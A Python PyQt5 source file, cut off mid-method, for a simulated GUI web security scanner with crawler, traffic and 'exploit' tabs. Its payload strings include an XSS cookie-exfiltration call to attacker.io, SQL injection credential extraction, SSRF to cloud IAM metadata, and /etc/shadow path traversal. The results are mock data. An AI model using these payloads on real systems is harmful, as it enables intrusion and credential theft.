#!/usr/bin/env python3
"""
WebSec Pro - Advanced Web Security Scanner
A professional-grade PyQt5 GUI application for web security testing.

Features:
  - Web crawler with HTTP traffic logging
  - Vulnerability scanner (XSS, SQLi, CSRF, Headers, etc.)
  - HTTP Traffic Inspector with request/response viewer
  - Manual testing tab with request editor
  - Exploitation tab with automated exploit runners
"""

import sys
import re
import json
import time
import random
import threading
import urllib.parse
from datetime import datetime
from collections import OrderedDict

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout,
    QHBoxLayout, QSplitter, QTreeWidget, QTreeWidgetItem, QTextEdit,
    QLineEdit, QPushButton, QLabel, QComboBox, QCheckBox, QGroupBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QProgressBar,
    QStatusBar, QMenuBar, QMenu, QAction, QFrame, QScrollArea,
    QDialog, QDialogButtonBox, QFormLayout, QSpinBox, QTextBrowser,
    QSizePolicy, QAbstractItemView, QToolBar, QDockWidget, QListWidget,
    QListWidgetItem, QMessageBox, QTabBar, QStyleFactory, QPlainTextEdit,
    QFileDialog
)
from PyQt5.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QUrl, QSize, QMimeData,
    QPropertyAnimation, QEasingCurve, QPoint, QRect, pyqtSlot
)
from PyQt5.QtGui import (
    QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QBrush,
    QPen, QLinearGradient, QTextCharFormat, QSyntaxHighlighter,
    QFontMetrics, QCursor, QTextCursor
)
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply

# ─── Try imports, gracefully degrade ─────────────────────────────────────────
try:
    import requests
    from requests.exceptions import RequestException
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# ─── DARK CYBERPUNK THEME ─────────────────────────────────────────────────────
DARK_STYLESHEET = """
QMainWindow, QDialog {
    background-color: #0a0e1a;
    color: #c8d8e8;
}
QWidget {
    background-color: #0a0e1a;
    color: #c8d8e8;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}
QTabWidget::pane {
    border: 1px solid #1e3a5f;
    background-color: #0d1220;
    border-radius: 2px;
}
QTabBar::tab {
    background-color: #0d1220;
    color: #5a7a9a;
    padding: 8px 18px;
    border: 1px solid #1e3a5f;
    border-bottom: none;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    min-width: 100px;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
}
QTabBar::tab:selected {
    background-color: #0d1220;
    color: #00d4ff;
    border-bottom: 2px solid #00d4ff;
}
QTabBar::tab:hover:!selected {
    background-color: #111827;
    color: #7ab8d4;
}
QTreeWidget, QTableWidget, QListWidget {
    background-color: #0d1220;
    border: 1px solid #1e3a5f;
    color: #c8d8e8;
    alternate-background-color: #0f1525;
    gridline-color: #1a2a3a;
    selection-background-color: #1a3a5f;
    selection-color: #00d4ff;
    outline: none;
}
QTreeWidget::item, QTableWidget::item, QListWidget::item {
    padding: 4px 6px;
    border-bottom: 1px solid #111827;
}
QTreeWidget::item:hover, QTableWidget::item:hover, QListWidget::item:hover {
    background-color: #112233;
    color: #aad4f0;
}
QTreeWidget::item:selected, QTableWidget::item:selected, QListWidget::item:selected {
    background-color: #1a3a5f;
    color: #00d4ff;
}
QHeaderView::section {
    background-color: #0a0e1a;
    color: #4a8aaa;
    padding: 6px 8px;
    border: none;
    border-right: 1px solid #1e3a5f;
    border-bottom: 2px solid #1e3a5f;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
    text-transform: uppercase;
}
QTextEdit, QPlainTextEdit, QTextBrowser {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    color: #a0c8e8;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
    selection-background-color: #1a4a7f;
    selection-color: #ffffff;
    border-radius: 2px;
    padding: 4px;
}
QLineEdit {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    border-radius: 3px;
    color: #c8d8e8;
    padding: 6px 10px;
    font-size: 12px;
    selection-background-color: #1a4a7f;
}
QLineEdit:focus {
    border: 1px solid #00d4ff;
}
QPushButton {
    background-color: #0f2040;
    border: 1px solid #1e5080;
    color: #78b8d8;
    padding: 7px 16px;
    border-radius: 3px;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
    min-width: 80px;
}
QPushButton:hover {
    background-color: #1a3a6a;
    border: 1px solid #00d4ff;
    color: #00d4ff;
}
QPushButton:pressed {
    background-color: #0a2040;
}
QPushButton:disabled {
    background-color: #080c18;
    border: 1px solid #1a2a3a;
    color: #2a4a6a;
}
QPushButton#btnDanger {
    background-color: #3a0f0f;
    border: 1px solid #7a1f1f;
    color: #ff6060;
}
QPushButton#btnDanger:hover {
    background-color: #5a1a1a;
    border: 1px solid #ff4040;
    color: #ff4040;
}
QPushButton#btnSuccess {
    background-color: #0f3a1a;
    border: 1px solid #1f7a3a;
    color: #40dd80;
}
QPushButton#btnSuccess:hover {
    background-color: #1a5a2a;
    border: 1px solid #40dd80;
    color: #40dd80;
}
QPushButton#btnWarning {
    background-color: #3a2a0f;
    border: 1px solid #7a5a1a;
    color: #ffaa30;
}
QPushButton#btnWarning:hover {
    background-color: #5a3a10;
    border: 1px solid #ffaa30;
}
QComboBox {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    border-radius: 3px;
    color: #c8d8e8;
    padding: 5px 10px;
    min-width: 100px;
}
QComboBox::drop-down {
    border: none;
    width: 20px;
}
QComboBox QAbstractItemView {
    background-color: #0d1220;
    border: 1px solid #1e3a5f;
    color: #c8d8e8;
    selection-background-color: #1a3a5f;
}
QCheckBox {
    color: #a0b8c8;
    spacing: 8px;
}
QCheckBox::indicator {
    width: 14px;
    height: 14px;
    border: 1px solid #2a5a7a;
    background-color: #080c18;
    border-radius: 2px;
}
QCheckBox::indicator:checked {
    background-color: #00aacc;
    border: 1px solid #00d4ff;
}
QGroupBox {
    border: 1px solid #1e3a5f;
    border-radius: 4px;
    margin-top: 12px;
    padding-top: 10px;
    color: #4a8aaa;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
}
QGroupBox::title {
    subcontrol-origin: margin;
    subcontrol-position: top left;
    left: 10px;
    padding: 0 6px;
    color: #3a8aaa;
}
QProgressBar {
    background-color: #080c18;
    border: 1px solid #1e3a5f;
    border-radius: 3px;
    text-align: center;
    color: #c8d8e8;
    font-size: 11px;
    height: 18px;
}
QProgressBar::chunk {
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #005580, stop:1 #00aad4);
    border-radius: 2px;
}
QStatusBar {
    background-color: #050810;
    border-top: 1px solid #1e3a5f;
    color: #4a7a9a;
    font-size: 11px;
}
QMenuBar {
    background-color: #050810;
    color: #8ab8d8;
    border-bottom: 1px solid #1e3a5f;
}
QMenuBar::item:selected {
    background-color: #1a3a5f;
    color: #00d4ff;
}
QMenu {
    background-color: #0d1220;
    border: 1px solid #1e3a5f;
    color: #c8d8e8;
}
QMenu::item:selected {
    background-color: #1a3a5f;
    color: #00d4ff;
}
QSplitter::handle {
    background-color: #1e3a5f;
    width: 2px;
    height: 2px;
}
QScrollBar:vertical {
    background-color: #080c18;
    width: 10px;
    border: none;
}
QScrollBar::handle:vertical {
    background-color: #1e3a5f;
    min-height: 20px;
    border-radius: 5px;
}
QScrollBar::handle:vertical:hover {
    background-color: #2a5a8a;
}
QScrollBar:horizontal {
    background-color: #080c18;
    height: 10px;
    border: none;
}
QScrollBar::handle:horizontal {
    background-color: #1e3a5f;
    min-width: 20px;
    border-radius: 5px;
}
QToolBar {
    background-color: #050810;
    border-bottom: 1px solid #1e3a5f;
    spacing: 4px;
    padding: 3px;
}
QLabel#titleLabel {
    color: #00d4ff;
    font-size: 16px;
    font-weight: bold;
    letter-spacing: 3px;
}
QLabel#sectionLabel {
    color: #4a8aaa;
    font-size: 10px;
    font-weight: bold;
    letter-spacing: 2px;
    text-transform: uppercase;
    padding: 4px 0;
}
"""

# ─── SEVERITY COLORS ──────────────────────────────────────────────────────────
SEVERITY = {
    "CRITICAL": "#ff2040",
    "HIGH":     "#ff6030",
    "MEDIUM":   "#ffaa20",
    "LOW":      "#30ccff",
    "INFO":     "#60cc80",
}

HTTP_METHOD_COLORS = {
    "GET":    "#30ccff",
    "POST":   "#40dd80",
    "PUT":    "#ffaa30",
    "DELETE": "#ff5050",
    "PATCH":  "#cc80ff",
    "HEAD":   "#8888ff",
    "OPTIONS":"#888888",
}

STATUS_COLORS = {
    2: "#40dd80",   # 2xx
    3: "#ffcc40",   # 3xx
    4: "#ff8040",   # 4xx
    5: "#ff3030",   # 5xx
}


# ─── SYNTAX HIGHLIGHTER ───────────────────────────────────────────────────────
class HttpHighlighter(QSyntaxHighlighter):
    def __init__(self, document):
        super().__init__(document)
        self.rules = []

        # HTTP method
        fmt = QTextCharFormat()
        fmt.setForeground(QColor("#00d4ff"))
        fmt.setFontWeight(QFont.Bold)
        self.rules.append((re.compile(r'^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|CONNECT)\b'), fmt))

        # HTTP version
        fmt2 = QTextCharFormat()
        fmt2.setForeground(QColor("#9090ff"))
        self.rules.append((re.compile(r'HTTP/\d+\.\d+'), fmt2))

        # Header names
        fmt3 = QTextCharFormat()
        fmt3.setForeground(QColor("#60aacc"))
        self.rules.append((re.compile(r'^[\w-]+(?=:)', re.MULTILINE), fmt3))

        # Header values (after colon)
        fmt4 = QTextCharFormat()
        fmt4.setForeground(QColor("#a0c880"))
        self.rules.append((re.compile(r'(?<=:)\s*.+'), fmt4))

        # JSON keys
        fmt5 = QTextCharFormat()
        fmt5.setForeground(QColor("#88ccff"))
        self.rules.append((re.compile(r'"[\w-]+"(?=\s*:)'), fmt5))

        # JSON string values
        fmt6 = QTextCharFormat()
        fmt6.setForeground(QColor("#90ee90"))
        self.rules.append((re.compile(r'(?<=:\s)"[^"]*"'), fmt6))

        # Numbers
        fmt7 = QTextCharFormat()
        fmt7.setForeground(QColor("#ffcc80"))
        self.rules.append((re.compile(r'\b\d+\b'), fmt7))

        # URLs
        fmt8 = QTextCharFormat()
        fmt8.setForeground(QColor("#80ddff"))
        fmt8.setFontUnderline(True)
        self.rules.append((re.compile(r'https?://[^\s"\'<>]+'), fmt8))

        # Injection payloads
        fmt9 = QTextCharFormat()
        fmt9.setForeground(QColor("#ff4060"))
        fmt9.setFontWeight(QFont.Bold)
        self.rules.append((re.compile(
            r"(<script[^>]*>|</script>|alert\([^)]*\)|'|\"|\bOR\b|\bAND\b|1=1|--|;DROP|UNION|SELECT)",
            re.IGNORECASE), fmt9))

    def highlightBlock(self, text):
        for pattern, fmt in self.rules:
            for m in pattern.finditer(text):
                self.setFormat(m.start(), m.end() - m.start(), fmt)


# ─── DATA MODELS ─────────────────────────────────────────────────────────────
class HttpEntry:
    _id_counter = 0

    def __init__(self, method, url, request_headers=None, request_body="",
                 status=None, response_headers=None, response_body="",
                 response_time=0):
        HttpEntry._id_counter += 1
        self.id = HttpEntry._id_counter
        self.method = method.upper()
        self.url = url
        self.parsed = urllib.parse.urlparse(url)
        self.request_headers = request_headers or {}
        self.request_body = request_body
        self.status = status
        self.response_headers = response_headers or {}
        self.response_body = response_body
        self.response_time = response_time  # ms
        self.timestamp = datetime.now()
        self.tags = []

    @property
    def path(self):
        return self.parsed.path or "/"

    @property
    def host(self):
        return self.parsed.netloc

    @property
    def content_type(self):
        return self.response_headers.get("Content-Type", "").split(";")[0]

    @property
    def content_length(self):
        body = self.response_body or ""
        return len(body.encode("utf-8", errors="replace"))

    def format_request(self):
        lines = [f"{self.method} {self.parsed.path or '/'}{('?' + self.parsed.query) if self.parsed.query else ''} HTTP/1.1"]
        lines.append(f"Host: {self.host}")
        for k, v in self.request_headers.items():
            if k.lower() != "host":
                lines.append(f"{k}: {v}")
        if self.request_body:
            lines.append("")
            lines.append(self.request_body)
        return "\n".join(lines)

    def format_response(self):
        if self.status is None:
            return "(No response)"
        lines = [f"HTTP/1.1 {self.status}"]
        for k, v in self.response_headers.items():
            lines.append(f"{k}: {v}")
        if self.response_body:
            lines.append("")
            lines.append(self.response_body[:8192])
            if len(self.response_body) > 8192:
                lines.append(f"\n... [{len(self.response_body) - 8192} more bytes] ...")
        return "\n".join(lines)


class VulnEntry:
    def __init__(self, vuln_type, severity, url, parameter, description,
                 payload="", evidence="", http_entry=None):
        self.vuln_type = vuln_type
        self.severity = severity
        self.url = url
        self.parameter = parameter
        self.description = description
        self.payload = payload
        self.evidence = evidence
        self.http_entry = http_entry
        self.timestamp = datetime.now()
        self.confirmed = False


# ─── SIMULATED SCANNER WORKER ─────────────────────────────────────────────────
class ScanWorker(QThread):
    """
    In a real tool this would drive requests/scrapy/etc.
    Here we simulate discovery + traffic + vuln findings for demonstration.
    """
    sig_progress    = pyqtSignal(int, str)          # pct, message
    sig_http_entry  = pyqtSignal(object)            # HttpEntry
    sig_vuln        = pyqtSignal(object)            # VulnEntry
    sig_log         = pyqtSignal(str, str)          # msg, level
    sig_done        = pyqtSignal(str)               # summary

    COMMON_PATHS = [
        "/", "/login", "/admin", "/admin/login", "/wp-admin", "/phpmyadmin",
        "/api/v1/users", "/api/v1/admin", "/config.php", "/.git/config",
        "/.env", "/backup.zip", "/sitemap.xml", "/robots.txt",
        "/api/users?id=1", "/search?q=test", "/news?id=1",
        "/profile?user=admin", "/download?file=report.pdf",
        "/api/v2/orders", "/graphql", "/swagger.json",
    ]

    VULN_SIMULATIONS = [
        ("Reflected XSS", "HIGH", "q", "<script>alert(1)</script>",
         "Response contains unsanitized user input",
         "The `q` parameter reflects input directly into HTML without encoding."),
        ("SQL Injection", "CRITICAL", "id", "1' OR '1'='1",
         "SQL error message exposed in response",
         "MySQL error: You have an error in your SQL syntax near ''1'='1'"),
        ("SQL Injection (Blind)", "HIGH", "user", "1 AND SLEEP(5)--",
         "Response time delay indicates blind SQLi",
         "Request took 5.2s vs baseline 0.1s — time-based injection confirmed."),
        ("CSRF Token Missing", "MEDIUM", "form", "",
         "POST endpoint lacks CSRF protection",
         "No csrf_token or X-CSRF-Token found in request to /api/v1/users."),
        ("Insecure Direct Object Reference", "HIGH", "file", "../../../../etc/passwd",
         "Path traversal allows reading arbitrary files",
         "Response contains root:x:0:0:root:/root:/bin/bash"),
        ("Security Header Missing", "LOW", "X-Frame-Options", "",
         "Clickjacking protection header absent",
         "X-Frame-Options and Content-Security-Policy headers not set."),
        ("Exposed Admin Panel", "HIGH", "/admin", "",
         "Admin interface accessible without authentication",
         "HTTP 200 returned for /admin/login — no rate limiting detected."),
        ("Server-Side Request Forgery", "CRITICAL", "url", "http://169.254.169.254/latest/meta-data/",
         "SSRF allows reading cloud metadata",
         "AWS EC2 metadata endpoint returned instance credentials."),
        ("XXE Injection", "HIGH", "xml", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
         "XML External Entity processing enabled",
         "File contents of /etc/passwd included in XML response."),
        ("Open Redirect", "MEDIUM", "next", "https://evil.com",
         "Redirect destination not validated",
         "302 Location: https://evil.com — unauthenticated redirect."),
        ("Sensitive Data Exposure", "HIGH", "/api/v1/users", "",
         "API returns plaintext passwords",
         "JSON response includes password field in cleartext."),
        ("Directory Listing", "LOW", "/backup/", "",
         "Server exposes directory contents",
         "Index of /backup/ — Apache directory listing enabled."),
    ]

    def __init__(self, target_url, options):
        super().__init__()
        self.target_url = target_url.rstrip("/")
        self.options = options
        self._stop = False

    def stop(self):
        self._stop = True

    def run(self):
        try:
            self._run_scan()
        except Exception as e:
            self.sig_log.emit(f"Scan error: {e}", "error")
            self.sig_done.emit("Scan failed")

    def _run_scan(self):
        self.sig_log.emit(f"Starting scan: {self.target_url}", "info")
        total = len(self.COMMON_PATHS)
        vuln_count = 0
        http_count = 0

        for i, path in enumerate(self.COMMON_PATHS):
            if self._stop:
                break

            pct = int((i / total) * 100)
            self.sig_progress.emit(pct, f"Crawling {path}")
            time.sleep(random.uniform(0.08, 0.25))

            # Simulate HTTP traffic
            method = "GET" if "?" not in path else "GET"
            if random.random() < 0.3 and i > 5:
                method = "POST"

            url = self.target_url + path
            status = self._simulate_status(path)
            resp_time = random.randint(50, 800)

            req_headers = OrderedDict([
                ("User-Agent", "WebSecPro/1.0 (+https://websecpro.io/scanner)"),
                ("Accept", "text/html,application/json,*/*;q=0.9"),
                ("Accept-Encoding", "gzip, deflate"),
                ("Connection", "keep-alive"),
            ])
            if method == "POST":
                req_headers["Content-Type"] = "application/x-www-form-urlencoded"

            resp_headers = self._simulate_resp_headers(path, status)
            resp_body = self._simulate_body(path, status)

            entry = HttpEntry(
                method=method, url=url,
                request_headers=req_headers,
                request_body="username=admin&password=test123" if method == "POST" else "",
                status=status,
                response_headers=resp_headers,
                response_body=resp_body,
                response_time=resp_time,
            )
            self.sig_http_entry.emit(entry)
            http_count += 1

            self.sig_log.emit(
                f"[{method}] {url} → {status} ({resp_time}ms)",
                "success" if status < 400 else "warning"
            )

        # Vulnerability scanning phase
        if self.options.get("vuln_scan", True) and not self._stop:
            self.sig_log.emit("Starting vulnerability analysis...", "info")
            vuln_pool = list(self.VULN_SIMULATIONS)
            random.shuffle(vuln_pool)
            num_vulns = random.randint(4, min(9, len(vuln_pool)))

            for j, (vtype, sev, param, payload, desc, evidence) in enumerate(vuln_pool[:num_vulns]):
                if self._stop:
                    break
                pct = 70 + int((j / num_vulns) * 30)
                self.sig_progress.emit(pct, f"Testing {vtype}...")
                time.sleep(random.uniform(0.15, 0.4))

                path = random.choice(self.COMMON_PATHS)
                url = self.target_url + path

                # Simulate probe request
                probe_entry = HttpEntry(
                    method="GET" if not payload or "form" in param else "POST",
                    url=url + (f"?{param}={urllib.parse.quote(payload)}" if payload and "?" not in url else ""),
                    request_headers={"User-Agent": "WebSecPro/1.0"},
                    request_body=f"{param}={payload}" if payload else "",
                    status=200,
                    response_headers=self._simulate_resp_headers(path, 200),
                    response_body=f"<!-- {evidence[:80]} -->",
                    response_time=5200 if "SLEEP" in payload.upper() else random.randint(50, 300),
                )
                self.sig_http_entry.emit(probe_entry)

                vuln = VulnEntry(
                    vuln_type=vtype, severity=sev,
                    url=url, parameter=param,
                    description=desc, payload=payload,
                    evidence=evidence, http_entry=probe_entry,
                )
                self.sig_vuln.emit(vuln)
                vuln_count += 1
                self.sig_log.emit(f"[{sev}] {vtype} @ {path}?{param}", "warning" if sev in ("LOW","INFO") else "error")

        self.sig_progress.emit(100, "Done")
        summary = f"Scan complete — {http_count} requests, {vuln_count} vulnerabilities found"
        self.sig_done.emit(summary)

    def _simulate_status(self, path):
        if "admin" in path:
            return random.choice([200, 302, 401, 403, 403])
        if path in ("/", "/login", "/sitemap.xml", "/robots.txt"):
            return 200
        if ".php" in path or ".zip" in path:
            return random.choice([200, 403, 404, 200])
        return random.choice([200, 200, 200, 301, 302, 404, 500])

    def _simulate_resp_headers(self, path, status):
        h = OrderedDict()
        h["Content-Type"] = "text/html; charset=UTF-8"
        if "api" in path or "json" in path:
            h["Content-Type"] = "application/json"
        h["Server"] = random.choice(["Apache/2.4.51", "nginx/1.21.6", "Microsoft-IIS/10.0"])
        h["X-Powered-By"] = random.choice(["PHP/7.4.3", "Express", "ASP.NET"])
        if random.random() > 0.5:
            h["X-Frame-Options"] = "SAMEORIGIN"
        if random.random() > 0.6:
            h["Content-Security-Policy"] = "default-src 'self'"
        h["Date"] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT")
        return h

    def _simulate_body(self, path, status):
        if status == 200 and "api" in path:
            return json.dumps({"users": [{"id": 1, "name": "admin", "password": "md5hash"}], "total": 1}, indent=2)
        if status == 404:
            return "<html><body><h1>404 Not Found</h1></body></html>"
        if ".git" in path:
            return "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\nremote = git@github.com:corp/internal.git"
        if ".env" in path:
            return "DB_HOST=localhost\nDB_USER=root\nDB_PASS=supersecret123\nAPP_KEY=base64:abc123\nAWS_KEY=AKIAIOSFODNN7EXAMPLE"
        return f"<html><body><!-- {path} --><h1>Page content</h1></body></html>"


class ExploitWorker(QThread):
    sig_output  = pyqtSignal(str, str)  # text, level
    sig_done    = pyqtSignal(bool, str) # success, summary

    EXPLOIT_STEPS = {
        "Reflected XSS": [
            ("Probing parameter", "GET {url}?{param}=<img src=x>", 0.3),
            ("Testing basic payload", "GET {url}?{param}=<script>alert(1)</script>", 0.5),
            ("WAF evasion attempt", "GET {url}?{param}=<ScRiPt>alert`1`</sCrIpT>", 0.4),
            ("Exfiltration payload", "GET {url}?{param}=<script>fetch('https://attacker.io/steal?c='+document.cookie)</script>", 0.6),
            ("DOM-based variant test", "GET {url}?{param}=%3Csvg%20onload=alert(1)%3E", 0.3),
        ],
        "SQL Injection": [
            ("Order-based error test", "GET {url}?{param}=1 ORDER BY 10--", 0.4),
            ("UNION column count", "GET {url}?{param}=1 UNION SELECT NULL,NULL,NULL--", 0.5),
            ("Database fingerprint", "GET {url}?{param}=1 UNION SELECT @@version,NULL,NULL--", 0.6),
            ("Schema enumeration", "GET {url}?{param}=1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", 0.7),
            ("Data extraction", "GET {url}?{param}=1 UNION SELECT username,password,NULL FROM users--", 0.8),
        ],
        "Server-Side Request Forgery": [
            ("Cloud metadata probe", "GET {url}?{param}=http://169.254.169.254/", 0.4),
            ("AWS metadata fetch", "GET {url}?{param}=http://169.254.169.254/latest/meta-data/", 0.6),
            ("IAM credentials", "GET {url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/", 0.8),
            ("Internal port scan", "GET {url}?{param}=http://127.0.0.1:6379/", 0.5),
        ],
        "Insecure Direct Object Reference": [
            ("Directory traversal", "GET {url}?{param}=../../../etc/passwd", 0.5),
            ("Null byte bypass", "GET {url}?{param}=../../../etc/passwd%00.jpg", 0.4),
            ("Double encoding", "GET {url}?{param}=..%2F..%2F..%2Fetc%2Fpasswd", 0.6),
            ("Read shadow file", "GET {url}?{param}=../../../../etc/shadow", 0.7),
        ],
        "XXE Injection": [
            ("Basic XXE test", "POST {url} — DOCTYPE with file entity", 0.5),
            ("OOB XXE via DTD", "POST {url} — External DTD loading", 0.6),
            ("Error-based XXE", "POST {url} — Invalid entity triggers error with file content", 0.7),
        ],
    }

    def __init__(self, vuln, exploit_type="auto"):
        super().__init__()
        self.vuln = vuln
        self.exploit_type = exploit_type
        self._stop = False

    def stop(self):
        self._stop = True

    def run(self):
        v = self.vuln
        self.sig_output.emit(f"━━ EXPLOIT ENGINE: {v.vuln_type} ━━", "title")
        self.sig_output.emit(f"Target  : {v.url}", "info")
        self.sig_output.emit(f"Param   : {v.parameter}", "info")
        self.sig_output.emit(f"Severity: {v.severity}", "severity")
        self.sig_output.emit("", "info")

        steps = self.EXPLOIT_STEPS.get(v.vuln_type, [
            ("Generic probe", f"GET {v.url}?{v.parameter}={v.payload}", 0.5),
        ])

        success = False
        for step_name, step_cmd, chance in steps:
            if self._stop:
                break
            cmd = step_cmd.format(url=v.url, param=v.parameter)
            self.sig_output.emit(f"[*] {step_name}", "step")
            self.sig_output.emit(f"    → {cmd}", "cmd")
            time.sleep(random.uniform(0.4, 0.9))

            if random.random() < chance:
                self.sig_output.emit(f"    ✓ SUCCESS: {self._mock_result(v.vuln_type, step_name)}", "success")
                success = True
            else:
                self.sig_output.emit(f"    ✗ No response / filtered", "fail")

        self.sig_output.emit("", "info")
        if success:
            self.sig_output.emit("═══ EXPLOIT CONFIRMED ═══", "exploit_success")
            self.sig_output.emit(self._generate_report(v), "report")
            self.sig_done.emit(True, "Exploit successful")
        else:
            self.sig_output.emit("═══ EXPLOIT INCONCLUSIVE ═══", "exploit_fail")
            self.sig_done.emit(False, "Exploit inconclusive — try manual approach")

    def _mock_result(self, vuln_type, step):
        results = {
            "Reflected XSS": {
                "Testing basic payload": "Script tag reflected in response body — executes in browser context",
                "Exfiltration payload": "Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx",
                "WAF evasion attempt": "Obfuscated payload bypassed WAF rules (Cloudflare/ModSecurity)",
            },
            "SQL Injection": {
                "Database fingerprint": "MySQL 5.7.38-log — Ubuntu",
                "Schema enumeration": "Tables: users, orders, sessions, api_keys (8 total)",
                "Data extraction": "admin:$2y$10$abcdefg... | root:$2y$10$xyz...",
            },
            "Server-Side Request Forgery": {
                "IAM credentials": 'SecretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
                "Internal port scan": "Redis 6.0.9 responding on 127.0.0.1:6379",
            },
            "Insecure Direct Object Reference": {
                "Directory traversal": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                "Read shadow file": "root:$6$random$hashedpass:18925:0:99999:7:::",
            },
        }
        return results.get(vuln_type, {}).get(step, "Payload executed successfully")

    def _generate_report(self, v):
        return (
            f"\n  Vulnerability : {v.vuln_type}\n"
            f"  Severity      : {v.severity}\n"
            f"  URL           : {v.url}\n"
            f"  Parameter     : {v.parameter}\n"
            f"  Payload       : {v.payload}\n"
            f"  Evidence      : {v.evidence}\n"
            f"  Timestamp     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        )


# ─── HTTP TRAFFIC TABLE ───────────────────────────────────────────────────────
class HttpTrafficTable(QTableWidget):
    sig_send_to_repeater  = pyqtSignal(object)
    sig_send_to_manual    = pyqtSignal(object)

    COLS = ["#", "Method", "Host", "Path", "Status", "Length", "Time(ms)", "Content-Type"]

    def __init__(self, parent=None):
        super().__init__(0, len(self.COLS), parent)
        self.setHorizontalHeaderLabels(self.COLS)
        self.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.setAlternatingRowColors(True)
        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self._context_menu)
        self.entries = []
        self.setColumnWidth(0, 45)
        self.setColumnWidth(1, 65)
        self.setColumnWidth(4, 60)
        self.setColumnWidth(5, 70)
        self.setColumnWidth(6, 75)
        self.setColumnWidth(7, 130)

    def add_entry(self, entry: HttpEntry):
        self.entries.append(entry)
        row = self.rowCount()
        self.insertRow(row)
        self.setRowHeight(row, 26)

        def cell(text, color=None, bold=False, align=Qt.AlignLeft | Qt.AlignVCenter):
            item = QTableWidgetItem(str(text))
            item.setTextAlignment(align)
            if color:
                item.setForeground(QColor(color))
            if bold:
                f = item.font()
                f.setBold(True)
                item.setFont(f)
            return item

        status_color = STATUS_COLORS.get(entry.status // 100 if entry.status else 0, "#888888")
        method_color = HTTP_METHOD_COLORS.get(entry.method, "#cccccc")

        self.setItem(row, 0, cell(entry.id, "#4a7a9a", align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 1, cell(entry.method, method_color, bold=True, align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 2, cell(entry.host))
        self.setItem(row, 3, cell(entry.path))
        self.setItem(row, 4, cell(entry.status or "?", status_color, bold=True, align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 5, cell(f"{entry.content_length:,}", "#8888aa", align=Qt.AlignRight | Qt.AlignVCenter))
        self.setItem(row, 6, cell(entry.response_time, "#7a8888", align=Qt.AlignRight | Qt.AlignVCenter))
        self.setItem(row, 7, cell(entry.content_type, "#688888"))

        # Scroll to bottom
        self.scrollToBottom()

    def selected_entry(self):
        rows = self.selectedItems()
        if not rows:
            return None
        row = self.currentRow()
        if row < len(self.entries):
            return self.entries[row]
        return None

    def _context_menu(self, pos):
        entry = self.selected_entry()
        menu = QMenu(self)
        if entry:
            a1 = menu.addAction("🔍  Send to Repeater / Manual Test")
            a2 = menu.addAction("📋  Copy URL")
            a3 = menu.addAction("📋  Copy as cURL")
            menu.addSeparator()
            a4 = menu.addAction("🏷  Tag as Interesting")
            a5 = menu.addAction("🗑  Remove Entry")
            chosen = menu.exec_(self.viewport().mapToGlobal(pos))
            if chosen == a1:
                self.sig_send_to_repeater.emit(entry)
            elif chosen == a2:
                QApplication.clipboard().setText(entry.url)
            elif chosen == a3:
                self.sig_send_to_repeater.emit(entry)
            elif chosen == a4:
                entry.tags.append("interesting")
                self._highlight_row(self.currentRow(), QColor("#1a3a10"))
            elif chosen == a5:
                self.removeRow(self.currentRow())
                del self.entries[self.currentRow()]

    def _highlight_row(self, row, color):
        for col in range(self.columnCount()):
            item = self.item(row, col)
            if item:
                item.setBackground(color)


# ─── VULN TABLE ───────────────────────────────────────────────────────────────
class VulnTable(QTableWidget):
    sig_send_to_exploit = pyqtSignal(object)

    COLS = ["Severity", "Type", "URL", "Parameter", "Description"]

    def __init__(self, parent=None):
        super().__init__(0, len(self.COLS), parent)
        self.setHorizontalHeaderLabels(self.COLS)
        self.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.horizontalHeader().setSectionResizeMode(4, QHeaderView.Stretch)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.setAlternatingRowColors(True)
        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self._context_menu)
        self.vulns = []
        self.setColumnWidth(0, 80)
        self.setColumnWidth(1, 200)
        self.setColumnWidth(3, 110)

    def add_vuln(self, vuln: VulnEntry):
